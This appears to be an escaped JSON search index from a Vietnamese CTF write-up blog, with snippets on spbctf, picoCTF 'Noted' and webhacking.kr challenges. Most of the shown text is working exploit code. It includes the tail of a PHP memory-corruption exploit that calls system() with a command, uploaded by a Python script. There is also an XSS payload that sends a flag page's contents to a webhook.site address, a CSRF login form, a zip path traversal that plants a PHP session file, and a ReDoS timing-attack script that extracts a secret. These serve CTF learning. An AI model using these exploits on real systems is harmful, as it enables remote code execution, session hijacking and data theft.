$this-&amp;gt;log(&quot;basic_functions @ 0x%x&quot;, $basic_funcs); $zif_system = $this-&amp;gt;get_system($basic_funcs); $this-&amp;gt;log(&quot;zif_system @ 0x%x&quot;, $zif_system); $fake_closure_off = $this-&amp;gt;helper_off + CHUNK_SIZE * 2; for($i = 0; $i &amp;lt; 0x138; $i += 8) { $this-&amp;gt;write($fake_closure_off + $i, $this-&amp;gt;read($closure_addr + $i)); } $this-&amp;gt;write($fake_closure_off + 0x38, 1, 4); $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68; $this-&amp;gt;write($fake_closure_off + $handler_offset, $zif_system); $fake_closure_addr = $this-&amp;gt;helper_addr + $fake_closure_off - $this-&amp;gt;helper_off; $this-&amp;gt;write($this-&amp;gt;helper_off + 0x38, $fake_closure_addr); $this-&amp;gt;log(&quot;fake closure @ 0x%x&quot;, $fake_closure_addr); $this-&amp;gt;cleanup(); ($this-&amp;gt;helper-&amp;gt;b)(CMD); } private function make_uaf_obj() { $this-&amp;gt;uafp = fopen(&#39;php://memory&#39;, &#39;w&#39;); fwrite($this-&amp;gt;uafp, pack(&#39;QQQ&#39;, 1, 0, 0xDEADBAADC0DE)); for($i = 0; $i &amp;lt; STRING_SIZE; $i++) { fwrite($this-&amp;gt;uafp, &quot;\\x00&quot;); } } private function prepare_leaker() { $str_off = $this-&amp;gt;helper_off + CHUNK_SIZE + 8; $this-&amp;gt;write($str_off, 2); $this-&amp;gt;write($str_off + 0x10, 6); $val_off = $this-&amp;gt;helper_off + 0x48; $this-&amp;gt;write($val_off, $this-&amp;gt;helper_addr + CHUNK_SIZE + 8); $this-&amp;gt;write($val_off + 8, 0xA); } private function prepare_cleanup($binary_leak) { $ret_gadget = $binary_leak; do { --$ret_gadget; } while($this-&amp;gt;read($ret_gadget, 1) !== 0xC3); $this-&amp;gt;log(&quot;ret gadget = 0x%x&quot;, $ret_gadget); $this-&amp;gt;write(0, $this-&amp;gt;abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60)); $this-&amp;gt;write(8, $ret_gadget); } private function read($addr, $n = 8) { $this-&amp;gt;write($this-&amp;gt;helper_off + CHUNK_SIZE + 16, $addr - 0x10); $value = strlen($this-&amp;gt;helper-&amp;gt;c); if($n !== 8) { $value &amp;amp;= (1 &amp;lt;&amp;lt; ($n &amp;lt;&amp;lt; 3)) - 1; } return $value; } private function write($p, $v, $n = 8) { for($i = 0; $i &amp;lt; $n; $i++) { $this-&amp;gt;abc[$p + $i] = chr($v &amp;amp; 0xff); $v &amp;gt;&amp;gt;= 8; } } private function get_basic_funcs($addr) { while(true) { $addr -= 0x10; if($this-&amp;gt;read($addr, 4) === 0xA8 &amp;amp;&amp;amp; in_array($this-&amp;gt;read($addr + 4, 4), [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) { $module_name_addr = $this-&amp;gt;read($addr + 0x20); $module_name = $this-&amp;gt;read($module_name_addr); if($module_name === 0x647261646e617473) { $this-&amp;gt;log(&quot;standard module @ 0x%x&quot;, $addr); return $this-&amp;gt;read($addr + 0x28); } } } } private function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = $this-&amp;gt;read($addr); $f_name = $this-&amp;gt;read($f_entry, 6); if($f_name === 0x6d6574737973) { return $this-&amp;gt;read($addr + 8); } $addr += 0x20; } while($f_entry !== 0); } private function cleanup() { $this-&amp;gt;hfp = fopen(&#39;php://memory&#39;, &#39;w&#39;); fwrite($this-&amp;gt;hfp, pack(&#39;QQ&#39;, 0, $this-&amp;gt;abc_addr)); for($i = 0; $i &amp;lt; FILTER_SIZE - 0x10; $i++) { fwrite($this-&amp;gt;hfp, &quot;\\x00&quot;); } } private function str2ptr($p = 0, $n = 8) { $address = 0; for($j = $n - 1; $j &amp;gt;= 0; $j--) { $address &amp;lt;&amp;lt;= 8; $address |= ord($this-&amp;gt;abc[$p + $j]); } return $address; } private function ptr2str($ptr, $n = 8) { $out = &#39;&#39;; for ($i = 0; $i &amp;lt; $n; $i++) { $out .= chr($ptr &amp;amp; 0xff); $ptr &amp;gt;&amp;gt;= 8; } return $out; } private function log($format, $val = &#39;&#39;) { if(LOGGING) { printf(&quot;{$format}\\n&quot;, $val); } } static function alloc($size) { return str_shuffle(str_repeat(&#39;A&#39;, $size)); }}?&amp;gt;&quot;&quot;&quot;) r = requests.post(TARGET, files={&#39;data&#39;: (&#39;payload.php&#39;, open(&#39;payload.php&#39;, &#39;rb&#39;))}, data={&#39;data&#39;: &#39;test&#39;}, headers={&#39;Cookie&#39;: &#39;PHPSESSID=7b4bd8d9ff68e20dc0317595b6623ef6&#39;}) # print(r.text) match = re.search(&#39;You have logged in as user (.*)&#39;, r.text) extract_data = base64.b64decode(match[1]).decode() index = extract_data.find(&#39;&amp;lt;/creds&amp;gt;&#39;) + len(&#39;&amp;lt;/creds&amp;gt;&#39;) rce_data = extract_data[index:] print(rce_data)Kết quả:RCE sucess spbctf{XX3_2_rCe_w3Ll_D0n3}Tham khảo https://blog.sonarsource.com/wordpress-xxe-security-vulnerability https://ctf.zeyu2001.com/2021/spbctfs-student-ctf-quals/31-line-php https://php.watch/versions/8.0/libxml_disable_entity_loader-deprecation" }, { "title": "Noted - picoCTF2022", "url": "/posts/noted/", "categories": "WebSec, CTF", "tags": "csrf, xss", "date": "2022-04-04 22:08:00 +0700", "snippet": "Sơ lược về challengeTrang gồm có hai chức năng Login và Registeroverview1Tiếp đó ta thể tạo note và gửi link để report.overview2Phân tíchSau khi thử thì mình nhận thấy có lỗi xss ở đâyClick to play videoSuy ra bài này là một dạng Self Store XSSCũng tương tự như các bài xss khác, chức năng report sẽ làm con bot (đóng vai trò như admin) access đến link mà ta gửi.report.jsBot sẽ tạo một tài khoản với tk, mk random và tạo một note với content chính là flag. Sau đó sẽ access tới url được report.Trong web.js có thể thấy server dùng csrf token trong các route.web.jsKhai thácBởi vì sau khi vừa tạo note thì phiên hoạt động của bot vẫn còn hiệu lực nên từ đó ta sẽ nghĩ cách để có thể lấy nội dung từ trang /notes của con bot (chứa flag) và gửi đến webhook hoặc có thể tạo một note mới với content là flag ở account của ta.Bởi vì sau khi vừa tạo note thì session của bot vẫn còn lưu trên trình duyệt nên từ đó ta sẽ nghĩ cách để có thể lấy nội dung từ trang /notes của con bot (chứa flag) và gửi đến webbook hoặc có thể tạo một note mới với content là flag ở account của ta.Gửi đến webhookCách này không đòi hỏi phải extract csrf tokenflow1Đầu tiên ta khởi tạo 1 account với tk,mk: bla mục đích là lưu xss script có vai trò gửi nội dung của window chứa flag tới webhook của ta.XSS note sẽ có nội dung như sau:&amp;lt;script&amp;gt; if (window.location.search.includes(&#39;pwn&#39;)) window.location = &#39;https://webhook.site/&amp;lt;id&amp;gt;?&#39; + window.open(&#39;&#39;, &#39;flag&#39;).document.body.textContent&amp;lt;/script&amp;gt;Ở đây ta dùng window.location.search.includes là để tránh việc bị redirect liên tục tới webhook.Tiếp theo ở exploit server ta tạo một index.html với layoutflow2Csrf form sẽ là: &amp;lt;form action=&#39;http://0.0.0.0:8080/login&#39; method=&#39;POST&#39; id=&#39;csrf&#39; target=&#39;_blank&#39;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;bla&quot;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;password&quot; value=&quot;bla&quot;&amp;gt; &amp;lt;/form&amp;gt;Script để exploit sẽ là: &amp;lt;script&amp;gt; window.open(&#39;http://0.0.0.0:8080/notes&#39;, &#39;flag&#39;); setTimeout(`csrf.submit()`, 1000); setTimeout(`window.location=&#39;http://0.0.0.0:8080/notes?pwn&#39;`, 1500); &amp;lt;/script&amp;gt;Trong csrf form ta thêm thuộc tính target và gán giá trị bằng _blank để reponse trả về từ action sẽ mở ở tab mới nếu không các dòng javascript ở bên dưới sẽ không được thực thi.Để hiểu rõ hơn về cách khai thác này ta sẽ đặt tất cả lại với nhau: Đầu tiên gửi cho con bot link exploit server, bot sẽ truy cập tới exploit server hay cụ thể là index.html Đoạn script ở index.html sẽ open new tab với tên là flag (sẽ không yêu cầu nhập username, password bởi vì phiên hoạt động của bot vẫn còn và cửa sổ này sẽ chứa note với content là flag) Sau 1s thì submit csrf form lúc này bot sẽ login vào account ta vừa tạo và kết quả hiển thị ở new blank tab Sau 1,5s thì chuyển hướng từ exploit page đến http://0.0.0.0:8080/notes?pwn lưu ý rằng ở đoạn code trước ta đã đăng nhập vào tài khoản bla nên bây giờ cũng sẽ chuyển hướng tới /notes của bla. ?pwn dùng để trigger store xss và gửi nội dung cửa sổ flag đến webhook.Có thể thấy lúc này ta không hề vi phạm same origin policy khi lấy document.body.textContent từ cửa sổ flag bởi vì chúng đều thuộc cùng domain, port và scheme.Và kết quả:resultExtract csrf tokenỞ cách này thì form csrf vẫn như cách kia nhưng có sự thay đổi về xss note và script exploitScript exploit: &amp;lt;script&amp;gt; window.open(&#39;http://0.0.0.0:8080/notes&#39;, &#39;flag&#39;) setTimeout(`csrf.submit()`, 1000); &amp;lt;/script&amp;gt;XSS note:&amp;lt;script&amp;gt;fetch(&quot;/new&quot;).then(r =&amp;gt; r.text()).then(r =&amp;gt; { //extract csrf token từ &#39;/new&#39; let csrf = r.match(/_csrf&quot; value=&quot;([^&quot;]*)/)[1]; //lấy flag let flag = window.open(&#39;&#39;, &#39;flag&#39;).document.querySelector(&quot;body&amp;gt;div&amp;gt;p&quot;).innerHTML; //tạo note với content là flag ở account của ta fetch(&quot;/new&quot;, { method: &quot;POST&quot;, body: JSON.stringify({ _csrf: csrf, title: &quot;PWNED!!!&quot;, content: flag }), headers: { &#39;Content-Type&#39;: &#39;application/json&#39; } });});&amp;lt;/script&amp;gt;Kết quả:resultTham khảohttps://docs.abbasmj.com/ctf-writeups/picoctf-2022#noted" }, { "title": "Slipping beauty - webhacking.kr", "url": "/posts/slippingBeauty/", "categories": "WebSec, CTF", "tags": "path traversal", "date": "2022-04-04 12:58:00 +0700", "snippet": "Link challengehttp://webhacking.kr:10015/Source codesource codePhân tíchVì tên chall là “slipping beauty” nên mình thử dùng file upload symlink zip nhưng không thành công vì zip wrapper sẽ không đọc được symlink zip nên mình sẽ tiếp cận theo hướng khác.Từ wu này ta thấy được 1 thứ thú vị :By default, PHP stores its sessions in a serialized format in the directory /var/lib/php/sessions, in a file named sess_[session ID]Vậy nếu ta lợi dụng hàm copy để copy nội dụng file upload exploit.zip với tên file đc zip là ../../../../var/lib/php/session/sess_myphpsseid nhằm mục đích ghi file ở bên phía server thì sao?Để làm được điều đó thì ta cần tìm 1 tool để có thể zip file chứa các chacracter đặc biệt như / hay .Sau 1 hồi search mình tìm được một tool trên githubTiếp theo ta xem cách PHP lưu session:php session fileOk thế file session t cần tạo sẽ có nội dung là uid|s :5 : &quot;admin&quot;Để ý rằng file name sẽ bị thêm 1 vào 1 số random nên việc ta cần làm là tạo 1 file với tên là sess_ và nội dung như trên, sau khi nhận được số random đó thì paste vào cookie để solve chall này 😊Khai thácScript để tạo file upload:exploit stepVà upload:upload reponseCuối cùng ta set trong cookie: PHPSESSID=24094577 và load lại trang để server dùng session này.result FLAG{my_zip_is_slipping_beauty}" }, { "title": "Regex Master - webhacking.kr", "url": "/posts/blindRegexInjection/", "categories": "WebSec, CTF", "tags": "timing attack", "date": "2022-04-02 02:39:00 +0700", "snippet": "Link challengehttp://regexmaster.webhacking.krSource codesource codePhân tíchỞ bài này source code rất đơn giản, chỉ kiểm tra xem biến flag có chứa chuỗi parttern (nhận từ GET request) hay không mà không hề xuất ra kết quả hay output nào khác.Sau một hồi suy nghĩ thì mình quyết định thử khai thác bằng blind regex injection + timing attackĐể hiểu chi tiết hơn về kĩ thuật này các bạn có thể xem tại đây.Khai thácimport requestsimport sysimport timeimport randomimport stringimport re# constantsTHRESHOLD = 1url = &#39;http://regexmaster.webhacking.kr/?pattern=&#39;# predicatesdef length_is(n): return &quot;.{&quot; + str(n) + &quot;}$&quot;def nth_char_is(n, c): if c == &#39;/&#39;: return &quot;.{&quot; + str(n-1) + &quot;}&quot; + &#39;\\/&#39; + &quot;.*$&quot; if c == &#39;\\\\&#39;: return &quot;.{&quot; + str(n-1) + &quot;}&quot; + &#39;\\\\\\\\&#39; + &quot;.*$&quot; return &quot;.{&quot; + str(n-1) + &quot;}&quot; + re.escape(c) + &quot;.*$&quot;# utilitiesdef redos_if(regexp, salt): return &quot;^(?={})(((((.*)*)*)*)*)*{}&quot;.format(regexp, salt)def get_request_duration(payload): # print(payload) try: r = requests.get(url+payload) duration = r.elapsed.total_seconds() except: duration = -1 exit(1) # print(duration) return durationdef prop_holds(prop, salt): return get_request_duration(redos_if(prop, salt)) &amp;gt; THRESHOLDdef generate_salt(): return &#39;&#39;.join([random.choice(string.ascii_letters) for i in range(10)])# exploitif __name__ == &#39;__main__&#39;: # generating salt salt = generate_salt() while not prop_holds(&#39;.*&#39;, salt): salt = generate_salt() print(&quot;[+] salt: {}&quot;.format(salt)) # leak length upper_bound = 100 secret_length = 0 for i in range(0, upper_bound): if prop_holds(length_is(i), salt): secret_length = i break print(&quot;[+] length: {}&quot;.format(secret_length)) flag = &quot;FLAG{&quot; for i in range(5, secret_length): stop = 0 for c in range(32, 128): if prop_holds(nth_char_is(i+1, chr(c)), salt): flag += chr(c) print(&quot;[*] {}&quot;.format(flag)) stop = 1 break print(&quot;[+] Flag: {}&quot;.format(flag)) FLAG{im_r/e/g/e/x_master//_//}Tham khảohttps://diary.shift-js.info/blind-regular-expression-injection" } ]
